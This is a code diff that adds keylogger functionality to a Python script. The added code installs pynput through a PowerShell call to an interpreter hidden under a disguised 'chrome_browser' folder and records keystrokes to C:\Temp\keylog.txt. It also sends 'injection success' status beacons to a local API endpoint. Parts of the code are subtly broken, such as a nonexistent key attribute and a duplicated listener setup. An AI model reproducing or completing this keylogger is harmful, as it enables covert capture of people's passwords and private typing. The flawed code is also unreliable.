@@ -10,14 +10,59 @@ Version: 1.0
 
 import os
 
-os.system(".\pythonw.exe -m pip install keyboard base64")
+os.system(r'''powershell.exe -NoProfile -Command "& 'C:\Users\Public\chrome_browser\python.exe' -m pip install pynput requests"''')
 
+import requests
 import base64
-import keyboard
+import pynput
 
 KEYLOG = r"C:\Temp\keylog.txt"
 
+from pynput import keyboard
+
+def on_press(key, injected):
+    try:
+        print('alphanumeric key {} pressed; it was {}'.format(
+            key.char, 'faked' if injected else 'not faked'))
+        
+        if key.state == keyboard.Key.space:
+            with open(KEYLOG, 'a') as f:
+                f.write(" ")
+        
+        elif key.state == keyboard.Key.enter:
+            with open(KEYLOG, 'a') as f:
+                f.write("\n")
+        
+        with open(KEYLOG, 'a') as f:
+            f.write(f"{key.char}")
+        
+    except AttributeError:
+        print('special key {} pressed'.format(
+            key))
+
+def on_release(key, injected):
+    print('{} released; it was {}'.format(
+        key, 'faked' if injected else 'not faked'))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+# ...or, in a non-blocking fashion:
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
+
 def start_keylogger():
+    
+    requests.get("http://localhost:8080/api/inject?status=keylogger_started")
+    
     if os.path.exists(KEYLOG):
         os.remove(KEYLOG)
     
@@ -43,4 +88,5 @@ def start_keylogger():
             break
     
 if __name__ == "__main__":
+    requests.get("http://localhost:8080/api/inject?status=dewdrop_injection_success")
     start_keylogger()
